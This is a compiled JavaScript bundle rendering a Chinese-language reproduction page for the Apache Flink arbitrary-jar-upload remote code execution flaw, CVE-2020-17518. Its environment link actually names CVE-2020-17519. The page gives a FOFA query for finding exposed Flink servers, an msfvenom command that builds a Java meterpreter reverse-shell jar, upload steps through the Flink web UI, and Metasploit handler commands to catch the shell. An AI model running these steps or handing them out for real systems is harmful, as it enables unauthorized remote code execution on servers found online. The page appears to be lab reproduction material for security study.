(window.webpackJsonp=window.webpackJsonp||[]).push([[37],{2015:function(a,s,t){a.exports=t.p+"assets/img/bb05ef9f-f86f-4bb5-bbcb-c13424d7aca4.b14ddbac.png"},2016:function(a,s,t){a.exports=t.p+"assets/img/1fcaa45f-0492-4411-b14f-e4554cf84e5b.e3649b24.png"},2017:function(a,s,t){a.exports=t.p+"assets/img/3def5e8c-6590-4ecd-8b61-dfcb095bdaa0.e028d353.png"},2018:function(a,s,t){a.exports=t.p+"assets/img/681f48a7-3501-4f52-8532-5efddcc0074f.c5e77e59.png"},2019:function(a,s,t){a.exports=t.p+"assets/img/16969b72-8db4-42f8-a0e3-b02022ab5f5b.2803c9a7.png"},2525:function(a,s,t){"use strict";t.r(s);var e=t(75),r=Object(e.a)({},(function(){var a=this,s=a.$createElement,e=a._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"apache-flink-upload-远程命令执行漏洞-cve-2020-17518"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apache-flink-upload-远程命令执行漏洞-cve-2020-17518"}},[a._v("#")]),a._v(" Apache Flink upload 远程命令执行漏洞 CVE-2020-17518")]),a._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),e("p",[a._v("近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞，攻击者通过漏洞可以获取系统权限")]),a._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v("Apache Flink <= 1.9.1")]),e("br"),a._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[e("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBcGFjaGUgRmxpbmsi"}},[a._v('FOFA: app="Apache Flink"')])],1),a._v(" "),e("h2",{attrs:{id:"环境搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[a._v("#")]),a._v(" 环境搭建")]),a._v(" "),e("a-alert",{attrs:{type:"success",message:"https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519",description:"",showIcon:""}}),a._v(" "),e("br"),a._v(" "),e("p",[e("img",{attrs:{src:t(761),alt:"06d235d4-965d-44e0-91c0-dc69b97bf48d"}})]),a._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),e("p",[a._v("点击查看文件上传页面")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2015),alt:"bb05ef9f-f86f-4bb5-bbcb-c13424d7aca4"}})]),a._v(" "),e("p",[a._v("打开MSF 生成一个 jar 木马")]),a._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx  LPORT=4444 -f jar > test.jar\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("点击 Add 上传 jar 文件")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2016),alt:"1fcaa45f-0492-4411-b14f-e4554cf84e5b"}})]),a._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[a._v("msf6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" use exploit/multi/handler\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("*"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" Using configured payload generic/shell_reverse_tcp\nmsf6 exploit"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("multi/handler"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" payload java/shell/reverse_tcp\npayload "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" java/shell/reverse_tcp\nmsf6 exploit"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("multi/handler"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" lhost xxx.xxx.xxx.xxx\nlhost "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" xxx.xxx.xxx.xxx\nmsf6 exploit"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("multi/handler"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" lport "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("4444")]),a._v("\nlport "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("4444")]),a._v("\nmsf6 exploit"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("multi/handler"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" run\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br"),e("span",{staticClass:"line-number"},[a._v("3")]),e("br"),e("span",{staticClass:"line-number"},[a._v("4")]),e("br"),e("span",{staticClass:"line-number"},[a._v("5")]),e("br"),e("span",{staticClass:"line-number"},[a._v("6")]),e("br"),e("span",{staticClass:"line-number"},[a._v("7")]),e("br"),e("span",{staticClass:"line-number"},[a._v("8")]),e("br"),e("span",{staticClass:"line-number"},[a._v("9")]),e("br")])]),e("p",[e("img",{attrs:{src:t(2017),alt:"3def5e8c-6590-4ecd-8b61-dfcb095bdaa0"}})]),a._v(" "),e("p",[a._v("点击下 submit")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2018),alt:"681f48a7-3501-4f52-8532-5efddcc0074f"}})]),a._v(" "),e("p",[e("img",{attrs:{src:t(2019),alt:"16969b72-8db4-42f8-a0e3-b02022ab5f5b"}})])],1)}),[],!1,null,null,null);s.default=r.exports},761:function(a,s,t){a.exports=t.p+"assets/img/06d235d4-965d-44e0-91c0-dc69b97bf48d.1883736d.png"}}]);